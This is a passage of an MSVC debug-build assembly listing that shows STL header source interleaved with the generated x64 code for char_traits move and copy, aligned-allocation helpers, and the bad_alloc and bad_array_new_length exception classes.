; 83   : #else // ^^^ _HAS_MEMCPY_MEMMOVE_INTRINSICS / !_HAS_MEMCPY_MEMMOVE_INTRINSICS vvv
; 84   : #if _HAS_CXX20
; 85   :         if (_STD is_constant_evaluated()) {
; 86   :             // dest: [_First1, _First1 + _Count)
; 87   :             // src: [_First2, _First2 + _Count)
; 88   :             // We need to handle overlapping ranges.
; 89   :             // If _First1 is in the src range, we need a backward loop.
; 90   :             // Otherwise, the forward loop works (even if the back of dest overlaps the front of src).
; 91   : 
; 92   :             // Usually, we would compare pointers with less-than, even though they could belong to different arrays.
; 93   :             // However, we're not allowed to do that during constant evaluation, so we need a linear scan for equality.
; 94   :             bool _Loop_forward = true;
; 95   : 
; 96   :             for (const _Elem* _Src = _First2; _Src != _First2 + _Count; ++_Src) {
; 97   :                 if (_First1 == _Src) {
; 98   :                     _Loop_forward = false;
; 99   :                     break;
; 100  :                 }
; 101  :             }
; 102  : 
; 103  :             if (_Loop_forward) {
; 104  :                 for (size_t _Idx = 0; _Idx != _Count; ++_Idx) {
; 105  :                     _First1[_Idx] = _First2[_Idx];
; 106  :                 }
; 107  :             } else {
; 108  :                 for (size_t _Idx = _Count; _Idx != 0; --_Idx) {
; 109  :                     _First1[_Idx - 1] = _First2[_Idx - 1];
; 110  :                 }
; 111  :             }
; 112  : 
; 113  :             return _First1;
; 114  :         }
; 115  : #endif // _HAS_CXX20
; 116  : 
; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  00029	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  00030	48 d1 e0	 shl	 rax, 1
  00033	4c 8b c0	 mov	 r8, rax
  00036	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _First2$[rbp]
  0003d	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _First1$[rbp]
  00044	e8 00 00 00 00	 call	 memmove

; 118  : #endif // ^^^ !_HAS_MEMCPY_MEMMOVE_INTRINSICS ^^^
; 119  : 
; 120  :         return _First1;

  00049	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _First1$[rbp]

; 121  :     }

  00050	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00057	5f		 pop	 rdi
  00058	5d		 pop	 rbp
  00059	c3		 ret	 0
?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ENDP ; std::_Char_traits<wchar_t,unsigned short>::move
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
_TEXT	SEGMENT
_First1$ = 224
_First2$ = 232
_Count$ = 240
?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z PROC ; std::_Char_traits<wchar_t,unsigned short>::copy, COMDAT

; 48   :         _In_reads_(_Count) const _Elem* const _First2, const size_t _Count) noexcept /* strengthened */ {

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 49   :         // copy [_First2, _First2 + _Count) to [_First1, ...)
; 50   : #if _HAS_MEMCPY_MEMMOVE_INTRINSICS
; 51   :         __builtin_memcpy(_First1, _First2, _Count * sizeof(_Elem));
; 52   : #else // ^^^ _HAS_MEMCPY_MEMMOVE_INTRINSICS / !_HAS_MEMCPY_MEMMOVE_INTRINSICS vvv
; 53   : #if _HAS_CXX20
; 54   :         if (_STD is_constant_evaluated()) {
; 55   :             // pre: [_First1, _First1 + _Count) and [_First2, _First2 + _Count) do not overlap
; 56   :             for (size_t _Idx = 0; _Idx != _Count; ++_Idx) {
; 57   :                 _First1[_Idx] = _First2[_Idx];
; 58   :             }
; 59   : 
; 60   :             return _First1;
; 61   :         }
; 62   : #endif // _HAS_CXX20
; 63   : 
; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00029	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  00030	48 d1 e0	 shl	 rax, 1
  00033	4c 8b c0	 mov	 r8, rax
  00036	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _First2$[rbp]
  0003d	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _First1$[rbp]
  00044	e8 00 00 00 00	 call	 memcpy

; 65   : #endif // ^^^ !_HAS_MEMCPY_MEMMOVE_INTRINSICS ^^^
; 66   : 
; 67   :         return _First1;

  00049	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _First1$[rbp]

; 68   :     }

  00050	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00057	5f		 pop	 rdi
  00058	5d		 pop	 rbp
  00059	c3		 ret	 0
?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ENDP ; std::_Char_traits<wchar_t,unsigned short>::copy
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z
_TEXT	SEGMENT
this$ = 224
__formal$ = 232
?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z PROC ; std::_Container_base0::_Alloc_proxy, COMDAT

; 1178 :     _CONSTEXPR20 void _Alloc_proxy(const _Fake_allocator&) noexcept {}

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00024	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002b	5f		 pop	 rdi
  0002c	5d		 pop	 rbp
  0002d	c3		 ret	 0
?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ENDP ; std::_Container_base0::_Alloc_proxy
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Orphan_all@_Container_base0@std@@QEAAXXZ
_TEXT	SEGMENT
this$ = 224
?_Orphan_all@_Container_base0@std@@QEAAXXZ PROC		; std::_Container_base0::_Orphan_all, COMDAT

; 1176 :     _CONSTEXPR20 void _Orphan_all() noexcept {}

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
?_Orphan_all@_Container_base0@std@@QEAAXXZ ENDP		; std::_Container_base0::_Orphan_all
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z
_TEXT	SEGMENT
_Ptr_user$ = 8
_Ptr_container$ = 40
_Min_back_shift$ = 72
_Back_shift$ = 104
_Ptr$ = 352
_Bytes$ = 360
?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z PROC ; std::_Adjust_manually_vector_aligned, COMDAT

; 158  : inline void _Adjust_manually_vector_aligned(void*& _Ptr, size_t& _Bytes) {

$LN11:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 68 01
	00 00		 sub	 rsp, 360		; 00000168H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 159  :     // adjust parameters from _Allocate_manually_vector_aligned to pass to operator delete
; 160  :     _Bytes += _Non_user_size;

  00024	48 8b 85 68 01
	00 00		 mov	 rax, QWORD PTR _Bytes$[rbp]
  0002b	48 8b 00	 mov	 rax, QWORD PTR [rax]
  0002e	48 83 c0 27	 add	 rax, 39			; 00000027H
  00032	48 8b 8d 68 01
	00 00		 mov	 rcx, QWORD PTR _Bytes$[rbp]
  00039	48 89 01	 mov	 QWORD PTR [rcx], rax

; 161  : 
; 162  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);

  0003c	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR _Ptr$[rbp]
  00043	48 8b 00	 mov	 rax, QWORD PTR [rax]
  00046	48 89 45 08	 mov	 QWORD PTR _Ptr_user$[rbp], rax

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  0004a	b8 08 00 00 00	 mov	 eax, 8
  0004f	48 6b c0 ff	 imul	 rax, rax, -1
  00053	48 8b 4d 08	 mov	 rcx, QWORD PTR _Ptr_user$[rbp]
  00057	48 8b 04 01	 mov	 rax, QWORD PTR [rcx+rax]
  0005b	48 89 45 28	 mov	 QWORD PTR _Ptr_container$[rbp], rax

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);

  0005f	48 c7 45 48 08
	00 00 00	 mov	 QWORD PTR _Min_back_shift$[rbp], 8

; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  00067	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR _Ptr$[rbp]
  0006e	48 8b 4d 28	 mov	 rcx, QWORD PTR _Ptr_container$[rbp]
  00072	48 8b 00	 mov	 rax, QWORD PTR [rax]
  00075	48 2b c1	 sub	 rax, rcx
  00078	48 89 45 68	 mov	 QWORD PTR _Back_shift$[rbp], rax
$LN4@Adjust_man:

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  0007c	48 83 7d 68 08	 cmp	 QWORD PTR _Back_shift$[rbp], 8
  00081	72 09		 jb	 SHORT $LN8@Adjust_man
  00083	48 83 7d 68 27	 cmp	 QWORD PTR _Back_shift$[rbp], 39 ; 00000027H
  00088	77 02		 ja	 SHORT $LN8@Adjust_man
  0008a	eb 0b		 jmp	 SHORT $LN9@Adjust_man
$LN8@Adjust_man:
$LN7@Adjust_man:
  0008c	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  00091	33 c0		 xor	 eax, eax
  00093	85 c0		 test	 eax, eax
  00095	75 f5		 jne	 SHORT $LN7@Adjust_man
$LN9@Adjust_man:
  00097	33 c0		 xor	 eax, eax
  00099	85 c0		 test	 eax, eax
  0009b	75 df		 jne	 SHORT $LN4@Adjust_man

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  0009d	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR _Ptr$[rbp]
  000a4	48 8b 4d 28	 mov	 rcx, QWORD PTR _Ptr_container$[rbp]
  000a8	48 89 08	 mov	 QWORD PTR [rax], rcx
$LN10@Adjust_man:

; 179  : }

  000ab	48 8d a5 48 01
	00 00		 lea	 rsp, QWORD PTR [rbp+328]
  000b2	5f		 pop	 rdi
  000b3	5d		 pop	 rbp
  000b4	c3		 ret	 0
?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z ENDP ; std::_Adjust_manually_vector_aligned
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z
_TEXT	SEGMENT
_Bytes$ = 224
?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z PROC ; std::_Default_allocate_traits::_Allocate, COMDAT

; 89   :         void* _Allocate(const size_t _Bytes) {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 90   :         return ::operator new(_Bytes);

  0001f	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Bytes$[rbp]
  00026	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new

; 91   :     }

  0002b	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00032	5f		 pop	 rdi
  00033	5d		 pop	 rbp
  00034	c3		 ret	 0
?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ENDP ; std::_Default_allocate_traits::_Allocate
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Throw_bad_array_new_length@std@@YAXXZ
_TEXT	SEGMENT
$T1 = 200
?_Throw_bad_array_new_length@std@@YAXXZ PROC		; std::_Throw_bad_array_new_length, COMDAT

; 63   : [[noreturn]] inline void _Throw_bad_array_new_length() {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec 18 01
	00 00		 sub	 rsp, 280		; 00000118H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 64   :     _THROW(bad_array_new_length{});

  0001b	48 8d 8d c8 00
	00 00		 lea	 rcx, QWORD PTR $T1[rbp]
  00022	e8 00 00 00 00	 call	 ??0bad_array_new_length@std@@QEAA@XZ ; std::bad_array_new_length::bad_array_new_length
  00027	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:_TI3?AVbad_array_new_length@std@@
  0002e	48 8d 8d c8 00
	00 00		 lea	 rcx, QWORD PTR $T1[rbp]
  00035	e8 00 00 00 00	 call	 _CxxThrowException
$LN2@Throw_bad_:

; 65   : }

  0003a	48 8d a5 f8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+248]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?_Throw_bad_array_new_length@std@@YAXXZ ENDP		; std::_Throw_bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??_Gbad_array_new_length@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 224
__flags$ = 232
??_Gbad_array_new_length@std@@UEAAPEAXI@Z PROC		; std::bad_array_new_length::`scalar deleting destructor', COMDAT
$LN4:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001e	e8 00 00 00 00	 call	 ??1bad_array_new_length@std@@UEAA@XZ
  00023	8b 85 e8 00 00
	00		 mov	 eax, DWORD PTR __flags$[rbp]
  00029	83 e0 01	 and	 eax, 1
  0002c	85 c0		 test	 eax, eax
  0002e	74 11		 je	 SHORT $LN2@scalar
  00030	ba 18 00 00 00	 mov	 edx, 24
  00035	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0003c	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN2@scalar:
  00041	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00048	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004f	5f		 pop	 rdi
  00050	5d		 pop	 rbp
  00051	c3		 ret	 0
??_Gbad_array_new_length@std@@UEAAPEAXI@Z ENDP		; std::bad_array_new_length::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??0bad_array_new_length@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 224
__that$ = 232
??0bad_array_new_length@std@@QEAA@AEBV01@@Z PROC	; std::bad_array_new_length::bad_array_new_length, COMDAT
$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR __that$[rbp]
  0001f	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ??0bad_alloc@std@@QEAA@AEBV01@@Z
  0002b	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00032	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7bad_array_new_length@std@@6B@
  00039	48 89 08	 mov	 QWORD PTR [rax], rcx
  0003c	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00043	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004a	5f		 pop	 rdi
  0004b	5d		 pop	 rbp
  0004c	c3		 ret	 0
??0bad_array_new_length@std@@QEAA@AEBV01@@Z ENDP	; std::bad_array_new_length::bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??1bad_array_new_length@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1bad_array_new_length@std@@UEAA@XZ PROC		; std::bad_array_new_length::~bad_array_new_length, COMDAT
$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001a	e8 00 00 00 00	 call	 ??1bad_alloc@std@@UEAA@XZ
  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
??1bad_array_new_length@std@@UEAA@XZ ENDP		; std::bad_array_new_length::~bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0bad_array_new_length@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??0bad_array_new_length@std@@QEAA@XZ PROC		; std::bad_array_new_length::bad_array_new_length, COMDAT

; 141  :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 140  :         : bad_alloc("bad array new length")

  0001f	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_0BF@KINCDENJ@bad?5array?5new?5length@
  00026	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0002d	e8 00 00 00 00	 call	 ??0bad_alloc@std@@AEAA@QEBD@Z ; std::bad_alloc::bad_alloc

; 141  :     {

  00032	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00039	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7bad_array_new_length@std@@6B@
  00040	48 89 08	 mov	 QWORD PTR [rax], rcx

; 142  :     }

  00043	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0004a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00051	5f		 pop	 rdi
  00052	5d		 pop	 rbp
  00053	c3		 ret	 0
??0bad_array_new_length@std@@QEAA@XZ ENDP		; std::bad_array_new_length::bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??_Gbad_alloc@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 224
__flags$ = 232
??_Gbad_alloc@std@@UEAAPEAXI@Z PROC			; std::bad_alloc::`scalar deleting destructor', COMDAT
$LN4:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001e	e8 00 00 00 00	 call	 ??1bad_alloc@std@@UEAA@XZ
  00023	8b 85 e8 00 00
	00		 mov	 eax, DWORD PTR __flags$[rbp]
  00029	83 e0 01	 and	 eax, 1
  0002c	85 c0		 test	 eax, eax
  0002e	74 11		 je	 SHORT $LN2@scalar
  00030	ba 18 00 00 00	 mov	 edx, 24
  00035	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0003c	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN2@scalar:
  00041	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00048	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004f	5f		 pop	 rdi
  00050	5d		 pop	 rbp
  00051	c3		 ret	 0
??_Gbad_alloc@std@@UEAAPEAXI@Z ENDP			; std::bad_alloc::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??0bad_alloc@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 224
__that$ = 232
??0bad_alloc@std@@QEAA@AEBV01@@Z PROC			; std::bad_alloc::bad_alloc, COMDAT
$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR __that$[rbp]
  0001f	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ??0exception@std@@QEAA@AEBV01@@Z ; std::exception::exception
  0002b	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00032	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7bad_alloc@std@@6B@
  00039	48 89 08	 mov	 QWORD PTR [rax], rcx
  0003c	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00043	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004a	5f		 pop	 rdi
  0004b	5d		 pop	 rbp
  0004c	c3		 ret	 0
??0bad_alloc@std@@QEAA@AEBV01@@Z ENDP			; std::bad_alloc::bad_alloc
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??1bad_alloc@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1bad_alloc@std@@UEAA@XZ PROC				; std::bad_alloc::~bad_alloc, COMDAT
$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001a	e8 00 00 00 00	 call	 ??1exception@std@@UEAA@XZ ; std::exception::~exception
  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
??1bad_alloc@std@@UEAA@XZ ENDP				; std::bad_alloc::~bad_alloc
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0bad_alloc@std@@AEAA@QEBD@Z
_TEXT	SEGMENT
this$ = 224
_Message$ = 232
??0bad_alloc@std@@AEAA@QEBD@Z PROC			; std::bad_alloc::bad_alloc, COMDAT

; 130  :     {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 129  :         : exception(_Message, 1)

  00024	41 b8 01 00 00
	00		 mov	 r8d, 1
  0002a	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _Message$[rbp]
  00031	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00038	e8 00 00 00 00	 call	 ??0exception@std@@QEAA@QEBDH@Z ; std::exception::exception

; 130  :     {

  0003d	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00044	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7bad_alloc@std@@6B@
  0004b	48 89 08	 mov	 QWORD PTR [rax], rcx

; 131  :     }

  0004e	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00055	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0005c	5f		 pop	 rdi
  0005d	5d		 pop	 rbp
  0005e	c3		 ret	 0
??0bad_alloc@std@@AEAA@QEBD@Z ENDP			; std::bad_alloc::bad_alloc
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??_Gexception@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 224
__flags$ = 232
??_Gexception@std@@UEAAPEAXI@Z PROC			; std::exception::`scalar deleting destructor', COMDAT
$LN4:
